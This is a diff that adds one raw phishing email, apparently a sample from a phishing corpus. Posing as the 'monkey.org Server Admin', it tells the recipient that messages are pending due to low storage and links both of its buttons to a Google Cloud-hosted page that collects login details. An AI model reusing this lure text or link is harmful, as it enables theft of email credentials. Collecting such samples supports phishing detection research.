@@ -1,0 +1,197 @@
+Return-Path: info@cshauxun.com
+Delivered-To: jose@monkey.org
+X-FDA: 79093016478.46.B4064E9
+Received: from srv4.cshauxun.com (srv4.cshauxun.com [198.23.176.109])
+	by imf08.b.hostedemail.com (Postfix) with ESMTP id E47891800038B
+	for <jose@monkey.org>; Tue,  1 Feb 2022 05:02:58 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=dkim; d=cshauxun.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type;
+ i=info@cshauxun.com;
+ bh=locZqCateDsuQlw+6qE1Qf6wEY0oP/H+gqqm+S3IDwU=;
+ b=tWclgYOMv8+CQL9dlfRto6CyGFU9tj4sF8T89seG3IMzbw3yUomxY+DA6smLmb1kTKwHBPEU5AsJ
+   xjhWnuTxJ0XeZVH7YcmpoRLA0Le59f+xdUxdhzpoXqI+EJC21u1IfKglMQKD3yHXOCN1ZyovBPuz
+   714hUe0FO/l2TUgflk4=
+From: "monkey.org" <info@cshauxun.com>
+To: jose@monkey.org
+Subject: Still  On E-mail Pending Status!  
+Date: 1 Feb 2022 06:02:55 +0100
+Message-ID: <20220201060255.AD493DD233053B1F@cshauxun.com>
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="----=_NextPart_000_0012_8F69DB6D.969B9F23"
+X-Rspam-User: nil
+Authentication-Results: imf08.b.hostedemail.com;
+	dkim=fail ("headers rsa verify failed") header.d=cshauxun.com header.s=dkim header.b=tWclgYOM;
+	spf=pass (imf08.b.hostedemail.com: domain of info@cshauxun.com designates 198.23.176.109 as permitted sender) smtp.mailfrom=info@cshauxun.com;
+	dmarc=pass (policy=reject) header.from=cshauxun.com
+X-Stat-Signature: 4gshaixr1dnc7z6of6pj1uqanta7q8yc
+X-Spam-Status: No, score=0.87
+X-Rspamd-Server: rspam02
+X-Rspamd-Queue-Id: E47891800038B
+X-HE-Tag: 1643691778-27421
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 8
+
+
+------=_NextPart_000_0012_8F69DB6D.969B9F23
+Content-Type: text/plain;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+test
+------=_NextPart_000_0012_8F69DB6D.969B9F23
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<table style=3D"border: 1px dotted rgb(211, 211, 211); border-image: none; =
+color: rgb(51, 51, 51); font-family: Roboto,Tahoma,Helvetica,sans-serif; fo=
+nt-size: 13px;">
+<tbody>
+<tr>
+<th style=3D"padding: 5px; border: 0px solid rgb(0, 0, 0); border-image: no=
+ne; width: 2px; color: rgb(0, 0, 0); background-color: rgb(2, 151, 64);">&n=
+bsp;</th>
+
+<td style=3D"padding: 5px; border: 0px solid rgb(0, 0, 0); border-image: no=
+ne; width: 665px; color: rgb(0, 0, 0); font-family: Roboto,Tahoma,Helvetica=
+,sans-serif; background-color: rgb(243, 255, 248);"><span style=3D"font-siz=
+e: 12px;">From monkey.org Server Admin<br></span></td></tr></tbody></table>=
+
+
+<div style=3D"width: 700px; color: rgb(0, 0, 0); font-family: Roboto,Tahoma=
+,Helvetica,sans-serif; font-size: 12px;"><br>
+	The following messages below are pending on the server due to low storage.=
+<p>You have six messages still pending to be delivered to your inbox since =
+Tuesday, February 1st, 2022.
+	</p>
+	<p>Find the subjects below and release messages using using the release li=
+nk=20
+	below.<br><br><b>Mailbox: <a style=3D"color: rgb(17, 85, 204);" href=3D"#N=
+OP">jose@monkey.org</a></b><br><br><br></div>
+<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
+x; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-=
+size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px; white-=
+space: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255);=
+ font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-st=
+roke-width: 0px; text-decoration-style: initial; text-decoration-color: ini=
+tial;" dir=3D"ltr">
+<table style=3D"width: 700px; height: 208px; color: rgb(0, 0, 0); font-size=
+: 15px;" border=3D"0" cellspacing=3D"2" cellpadding=3D"2">
+<tbody>
+<tr>
+<td style=3D"margin: 0px; width: 340px; font-family: Calibri; background-co=
+lor: rgb(243, 255, 248);"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Subject</strong></td>
+<td style=3D"margin: 0px; width: 230px; font-family: Calibri; background-co=
+lor: rgb(243, 255, 248);"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Recipient</strong></=
+td>
+<td style=3D"margin: 0px; width: 150px; font-family: Calibri; background-co=
+lor: rgb(243, 255, 248);"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Date</strong></td></tr>
+<tr>
+<td style=3D"margin: 0px; width: 340px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&#9888;&#65039; FW: Invoice copy AWB =
+No. 325-2322 </td>
+
+<td style=3D"margin: 0px; width: 230px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;To: <a style=3D"color: rg=
+b(17, 85, 204);" href=3D"#NOP">jose@monkey.org</a></td>
+<td style=3D"margin: 0px; width: 150px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;01/02/2022</td></tr=
+>
+<tr>
+<td style=3D"margin: 0px; width: 340px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&#9888;&#65039; Updated Sea Freight Q=
+uotation</td>
+<td style=3D"margin: 0px; width: 230px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;To: <a style=3D"color: rg=
+b(17, 85, 204);" href=3D"#NOP">jose@monkey.org</a></td>
+<td style=3D"margin: 0px; width: 150px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;01/02/2022</td></tr=
+>
+<tr>
+<td style=3D"margin: 0px; width: 340px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&#9888;&#65039; AW: PO#203477 INVOICE=
+S</td>
+<td style=3D"margin: 0px; width: 230px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;To: <a style=3D"color: rg=
+b(17, 85, 204);" href=3D"#NOP">jose@monkey.org</a></td>
+<td style=3D"margin: 0px; width: 150px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;31/01/2022</td></tr=
+>
+<tr>
+<td style=3D"margin: 0px; width: 340px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&#9888;&#65039; Re: &#20851;&#20110;&=
+#21551;&#21160;&#21496;&#32534;&#21046;01/02/2022&#35745;&#21010;</td>
+<td style=3D"margin: 0px; width: 230px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;To: <a style=3D"color: rg=
+b(17, 85, 204);" href=3D"#NOP">jose@monkey.org</a></td>
+<td style=3D"margin: 0px; width: 150px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;29/01/2022</td></tr=
+>
+<tr>
+<td style=3D"margin: 0px; width: 340px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&#9888;&#65039; Fwd: Payment ---- For=
+warded message ----</td>
+<td style=3D"margin: 0px; width: 230px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;To: <a style=3D"color: rg=
+b(17, 85, 204);" href=3D"#NOP">jose@monkey.org</a></td>
+<td style=3D"margin: 0px; width: 150px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;28/01/2022</td></tr=
+>
+<tr>
+<td style=3D"margin: 0px; width: 340px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&#9888;&#65039; COVID-19 Safety Measu=
+res</td>
+<td style=3D"margin: 0px; width: 230px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;To: <a style=3D"color: rg=
+b(17, 85, 204);" href=3D"#NOP">jose@monkey.org</a></td>
+<td style=3D"margin: 0px; width: 160px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;28/01/2022</s=
+pan></td></tr></tbody></table>
+<div style=3D"margin: 0px;">&nbsp;</div>
+<ol style=3D"padding: 30px;">
+<li><a style=3D"background: rgb(80, 110, 216); padding: 10px; border-radius=
+: 2px; color: rgb(255, 255, 255); text-decoration: none;" href=3D"https://s=
+torage.cloud.google.com/maintainancecomponeta.appspot.com/newfcocindex.html=
+#jose@monkey.org" target=3D"_blank" rel=3D"">
+<font size=3D"5">Release Pending Mails to inbox</font></a><font size=3D"5">=
+ </font> <br><br><br>
+<li><a style=3D"background: rgb(212, 0, 0); padding: 10px; border-radius: 2=
+px; color: rgb(255, 255, 255); text-decoration: none;" href=3D"https://stor=
+age.cloud.google.com/maintainancecomponeta.appspot.com/newfcocindex.html#jo=
+se@monkey.org" target=3D"_blank" rel=3D"">
+<font size=3D"3">Report Error To IT Help Desk</font></a><font size=3D"3"> <=
+/font> </li></ol>
+<div style=3D"margin: 0px; font-family: arial, helvetica, sans-serif;"><br>=
+<br>
+<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
+x; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-=
+size: small; font-style: normal; font-weight: 400; word-spacing: 0px; white=
+-space: normal; font-variant-ligatures: normal; font-variant-caps: normal; =
+text-decoration-style: initial; text-decoration-color: initial;" dir=3D"ltr=
+"><span style=3D"color: rgb(0, 0, 0); font-family: Calibri; font-size: 14px=
+;">
+You will receive pending emails after successful login via portal as we apo=
+logize for the inconvenience.</span></div></div>
+<div style=3D"width: 700px; margin-top: 30px;">
+<hr>
+</div>
+<div style=3D"color: rgb(131, 130, 130); line-height: 2; font-size: 78%; ma=
+rgin-top: 10px;"><em>Message Encrypted by monkey.org</em>&nbsp;<em>&copy; A=
+ll Rights Reserved.</em> | If you do not wish to=20
+	receive this message <a href=3D"mailto: unsubscribe@monkey.org?subject=3DU=
+nsubscribe&amp;body=3DKindly Unsubscribe From this newsletter" target=3D"_b=
+lank" rel=3D"">Unsubscribe.</a> </div></div></body></html>
+------=_NextPart_000_0012_8F69DB6D.969B9F23--
+
